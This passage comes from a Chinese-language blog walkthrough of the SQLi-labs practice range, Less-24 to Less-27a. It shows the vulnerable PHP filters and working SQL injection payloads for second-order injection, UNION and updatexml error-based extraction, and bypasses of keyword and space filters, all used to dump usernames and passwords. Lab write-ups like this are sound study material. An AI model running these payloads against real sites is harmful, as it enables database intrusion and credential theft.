password=&#x27;$curr_pass&#x27;</span></code></pre><p>此时就完全改变了语义，直接就修改掉了 admin 用户的密码。</p><h3 id="步骤演示"><a href="#步骤演示" class="headerlink" title="步骤演示"></a>步骤演示</h3><p>常见一个<code>admin&#39;#</code>开头的用户名，下面列举的几种都可以，以此类推，很灵活：</p><pre><code class="hljs jboss-cli">admin&#x27;<span class="hljs-comment">#1</span>admin&#x27;<span class="hljs-comment">#233</span>admin&#x27;<span class="hljs-comment">#gg</span><span class="hljs-string">...</span></code></pre><p>注册完成后数据库的记录信息如下：</p><pre><code class="hljs Bash">mysql&gt; select * from users;+----+------------+----------+| id | username   | password |+----+------------+----------+|  1 | Dumb       | 0        ||  2 | Angelina   | 0        ||  3 | Dummy      | 0        ||  4 | secure     | 0        ||  5 | stupid     | 0        ||  6 | superman   | 0        ||  7 | batman     | 0        ||  8 | admin      | 0        ||  9 | admin1     | 0        || 10 | admin2     | 0        || 11 | admin3     | 0        || 12 | dhakkan    | 0        || 14 | admin4     | 0        || 15 | admin<span class="hljs-string">&#x27;#sec | 123      |</span><span class="hljs-string">+----+------------+----------+</span><span class="hljs-string">14 rows in set (0.00 sec)</span></code></pre><p>成功添加了记录，这里单引号数据库中中看没有被虽然转义了，这是因为转义只不过是暂时的，最后存入到数据库的时候还是没变的。</p><p>接下来登录 `admin’#sec用户，然后来修改当前的密码：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/02.png" alt="Less-24(二次注入)"></p><p>此时来数据库中查看，可以发现成功修改掉了 admin 用的密码了：</p><pre><code class="hljs Bash">mysql&gt; select * from users;+----+------------+----------+| id | username   | password |+----+------------+----------+|  1 | Dumb       | 0        ||  2 | Angelina   | 0        ||  3 | Dummy      | 0        ||  4 | secure     | 0        ||  5 | stupid     | 0        ||  6 | superman   | 0        ||  7 | batman     | 0        ||  8 | admin      | 1234     ||  9 | admin1     | 0        || 10 | admin2     | 0        || 11 | admin3     | 0        || 12 | dhakkan    | 0        || 14 | admin4     | 0        || 15 | admin<span class="hljs-string">&#x27;#sec | 123      |</span><span class="hljs-string">+----+------------+----------+</span><span class="hljs-string">14 rows in set (0.00 sec)</span></code></pre><h2 id="Less-25-过滤or和and"><a href="#Less-25-过滤or和and" class="headerlink" title="Less-25(过滤or和and)"></a>Less-25(过滤or和and)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><h3 id="关键代码分析："><a href="#关键代码分析：" class="headerlink" title="关键代码分析："></a>关键代码分析：</h3><pre><code class="hljs Php"><span class="hljs-comment"># id 直接单引号拼接</span><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-comment"># 但是 id 被如下函数过滤了</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/AND/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;</code></pre><p>过滤了 <code>or</code> <code>and</code> 的get注入</p><h3 id="测试阶段"><a href="#测试阶段" class="headerlink" title="测试阶段"></a>测试阶段</h3><p><code>&#39;</code>报错 <code>&#39;&#39;</code>不报错 那么就是<code>&#39;</code>闭合</p><p>我们知道可以用<code>--+</code>注释掉后面</p><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; order <span class="hljs-keyword">by</span> <span class="hljs-number">1</span> <span class="hljs-comment">--+</span></code></pre><p>语法不正确 发现过滤了 <code>or</code> </p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/03.png" alt="Less-25(过滤or和and)"></p><p>那么我们继续构造，3正常，4报错</p><pre><code class="hljs sql">?id=1&#x27; oorrder by 1 <span class="hljs-comment">--+</span>?id=1&#x27; oorrder by 2 <span class="hljs-comment">--+</span>?id=1&#x27; oorrder by 3 <span class="hljs-comment">--+</span>?id=1&#x27; oorrder by 4 <span class="hljs-comment">--+</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/04.png" alt="Less-25(过滤or和and)"></p><h3 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h3><pre><code class="hljs sql">http://sqli.pl/Less-25/?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/05.png" alt="Less-25(过滤or和and)"></p><h3 id="爆破表名"><a href="#爆破表名" class="headerlink" title="爆破表名"></a>爆破表名</h3><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p>information 的or</p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> infoorrmation_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/06.png" alt="Less-25(过滤or和and)"></p><p>爆破列名</p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> infoorrmation_schema.columns  <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/07.png" alt="Less-25(过滤or和and)"></p><h3 id="爆破出数据"><a href="#爆破出数据" class="headerlink" title="爆破出数据"></a>爆破出数据</h3><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd+SEPARATOORR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/08.png" alt="Less-25(过滤or和and)"></p><h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=$id</code></td></tr></tbody></table><p>与 Less-25 相比，只是拼接方式改变，因为代码中没有输出报错信息，所以也无法进行报错注入，其他利用方式都是一样的，这里不再啰嗦。</p><pre><code class="hljs sql">?id=-1 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd+SEPARATOORR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="Less-26-过滤or、and、-、注释、空格和斜线"><a href="#Less-26-过滤or、and、-、注释、空格和斜线" class="headerlink" title="Less-26(过滤or、and、/*、注释、空格和斜线)"></a>Less-26(过滤or、and、/*、注释、空格和斜线)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><pre><code class="hljs Php"><span class="hljs-comment"># 过滤了 or 和 and 大小写</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);            <span class="hljs-comment">//strip out OR (non case sensitive)</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/and/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//Strip out AND (non case sensitive)</span><span class="hljs-comment"># 过滤了 /*</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//strip out /*</span><span class="hljs-comment"># 过滤了 -- 和 # 注释</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//Strip out --</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);            <span class="hljs-comment">//Strip out #</span><span class="hljs-comment"># 过滤了空格</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\s]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//Strip out spaces</span><span class="hljs-comment"># 过滤了斜线</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//Strip out slashes</span><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;</code></pre><p>过滤了 or 和 and 可以采用 双写或者 &amp;&amp; || 绕过</p><p>过滤注释 可以使用闭合绕过</p><p>过滤了空格 可以使用如下的符号来替代：</p><table><thead><tr><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>%09</td><td>TAB 键(水平)</td></tr><tr><td>%0a</td><td>新建一行</td></tr><tr><td>%0c</td><td>新的一页</td></tr><tr><td>%0d</td><td>return 功能</td></tr><tr><td>%0b</td><td>TAB 键(垂直)</td></tr><tr><td>%a0</td><td>空格</td></tr></tbody></table><p><strong>由于我在windows下无法使用一些特殊的字符代替空格，此处是因为apache的解析的问题。</strong></p><p>直接使用报错注入</p><h3 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h3><p>（在hackbar中输入&amp;&amp;时，需要自行URL编码为%26%26，否则会报错，而输入||不需要）</p><pre><code class="hljs sql">?id=1&#x27;||updatexml(1,concat(&#x27;:&#x27;,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>())),<span class="hljs-number">1</span>)%<span class="hljs-number">26</span>%<span class="hljs-number">26</span><span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/09.png" alt="Less-25(过滤or和and)"></p><h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><pre><code class="hljs sql">?id=1&#x27;||updatexml(1,concat(&#x27;:&#x27;,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>)||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/10.png" alt="Less-25(过滤or和and)"></p><p>but 好像不行，过滤了<code>空格</code>和<code>or</code></p><p>绕过</p><pre><code class="hljs sql">?id=1&#x27;||updatexml(1,concat(&#x27;:&#x27;,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(table_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-string">&#x27;security&#x27;</span>))),<span class="hljs-number">1</span>)||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/11.png" alt="Less-25(过滤or和and)"></p><h3 id="爆破列名"><a href="#爆破列名" class="headerlink" title="爆破列名"></a>爆破列名</h3><pre><code class="hljs sql">?id=1&#x27;||updatexml(1,concat(&#x27;:&#x27;,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(column_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.columns)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-string">&#x27;security&#x27;</span>%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>table_name=<span class="hljs-string">&#x27;users&#x27;</span>))),<span class="hljs-number">1</span>)||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/12.png" alt="Less-25(过滤or和and)"></p><h3 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h3><pre><code class="hljs sql">?id=1&#x27;||updatexml(1,concat(&#x27;:&#x27;,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>))),<span class="hljs-number">1</span>)||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><span class="hljs-string"></span><span class="hljs-string">?id=1&#x27;</span>||updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-string">&#x27;:&#x27;</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)<span class="hljs-keyword">where</span>(username=<span class="hljs-string">&#x27;admin&#x27;</span>))),<span class="hljs-number">1</span>)||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/13.png" alt="Less-25(过滤or和and)"></p><h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>与 Less-26 相比，只是拼接方式改变了，<code>因为没有输出报错信息，所以不能使用报错注入了</code>，只能被迫抛弃win环境使用docker，直接上payload。</p><pre><code class="hljs sql">?id=999&#x27;)%a0union%a0select%a01,database(),3||(&#x27;1&#x27;)=(&#x27;1?id=999&#x27;)%a0union%a0select%a01,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(table_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-string">&#x27;security&#x27;</span>)),<span class="hljs-number">3</span>||(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span><span class="hljs-string"></span><span class="hljs-string">?id=999&#x27;</span>)%a0union%a0select%a01,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(column_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.columns)<span class="hljs-keyword">where</span>(table_name=<span class="hljs-string">&#x27;users&#x27;</span>)),<span class="hljs-number">3</span>||(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span><span class="hljs-string"></span><span class="hljs-string">?id=999&#x27;</span>)%a0union%a0select%a01,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">3</span>||(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span></code></pre><h2 id="Less-27-过滤了很多"><a href="#Less-27-过滤了很多" class="headerlink" title="Less-27(过滤了很多)"></a>Less-27(过滤了很多)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>查看代码，过滤规则又增加了许多：</p><pre><code class="hljs php"><span class="hljs-comment"># 过滤了 /*</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤了 -</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤了 #</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤了空格</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤了 select /m 严格模式 不可以使用双写绕过</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/select/m&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/Select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/SELECT/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤了 union UNION</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/Union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/UNION/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;</code></pre><blockquote><p>PHP语法</p></blockquote><blockquote><p>正则表达式</p></blockquote><p><a href="http://php.net/manual/zh/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers">PHP正则表达式的模式修饰符（官方文档）</a><br><a href="http://www.php.cn/php-weizijiaocheng-354831.html">PHP正则中的i,m,s,x,e</a></p><blockquote><ul><li><code>i</code><br>如果设定了此修正符，模式中的字符将同时匹配大小写字母。</li><li><code>m</code><br>如果设定了此修正符，行起始和行结束除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。</li><li><code>s</code><br>如果设定了此修正符，模式中的圆点元字符<code>.</code>匹配所有的字符，包括换行符。没有此设定的话，则不包括换行符。</li><li><code>x</code><br>如果设定了此修正符，模式中的空白字符除了被转义的或在字符类中的以外完全被忽略，在未转义的字符类之外的<code>#</code>以及下一个换行符之间的所有字符，包括两头，也都被忽略。</li><li><code>e</code><br>如果设定了此修正符，<code>preg_replace()</code>在替换字符串中对逆向引用作正常的替换。</li><li><code>?</code><br>在<code>.</code>/<code>+</code>/<code>*</code>之后表示非贪婪匹配，<code>.</code>/<code>+</code>/<code>*</code>限定符都是贪婪的，它们会尽可能多的匹配文字，在它们的后面加上一个<code>?</code>就可以实现非贪婪或最小匹配。</li></ul></blockquote><p>union 和 select 没有忽略大小写 导致写了很多冗杂的规则，但还是可以轻易绕过。</p><pre><code class="hljs bash"><span class="hljs-comment"># 大小写混写</span>unioNunIonseLect...<span class="hljs-comment"># 嵌套双写</span>uunionnionsselectelectununionion...</code></pre><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>单引号字符型，过滤掉了#,–,空格等字符</p><pre><code class="hljs sql">?id=1&#x27;||&#x27;1&#x27;=&#x27;1</code></pre><p>成功闭合<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/14.png" alt="Less-27"></p><h3 id="判断数据库名"><a href="#判断数据库名" class="headerlink" title="判断数据库名"></a>判断数据库名</h3><pre><code class="hljs sql">?id=999&#x27;%0aunIon%0aselEct%0a1,database(),3%0a||&#x27;1&#x27;=&#x27;1<span class="hljs-comment">#使用%0a代替空格，unIon、selEct随机大小写绕过，-被过滤了，使用999让其爆出显错位</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/15.png" alt="Less-27"></p><h3 id="判断表名"><a href="#判断表名" class="headerlink" title="判断表名"></a>判断表名</h3><pre><code class="hljs sql">?id=999&#x27;%0aunIon%0aselEct%0a1,(<span class="hljs-keyword">selEct</span>(<span class="hljs-keyword">group_concat</span>(table_name))<span class="hljs-keyword">from</span>(information_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-string">&#x27;security&#x27;</span>)),<span class="hljs-number">3</span>%<span class="hljs-number">0</span>a||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/16.png" alt="Less-27"></p><h3 id="判断列名"><a href="#判断列名" class="headerlink" title="判断列名"></a>判断列名</h3><pre><code class="hljs sql">?id=999&#x27;%0aunIon%0aselEct%0a1,(<span class="hljs-keyword">selEct</span>(<span class="hljs-keyword">group_concat</span>(column_name))<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_name=<span class="hljs-string">&#x27;users&#x27;</span>)),<span class="hljs-number">3</span>%<span class="hljs-number">0</span>a||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/17.png" alt="Less-27"></p><h3 id="得到数据"><a href="#得到数据" class="headerlink" title="得到数据"></a>得到数据</h3><pre><code class="hljs sql">?id=999&#x27;%0aunIon%0aselEct%0a1,(<span class="hljs-keyword">selEct</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">3</span>%<span class="hljs-number">0</span>a||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/18.png" alt="Less-27"></p><blockquote><p>总结</p></blockquote><p>1 这里空格<code>%0a</code>代替</p><p>2这里正则表达式是只要你含有 就会一直匹配 双写不能绕过</p><p>3当-1不能用的时候 随便用一个错误的值把显示的位置让出来 给你要的数据</p><h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-27 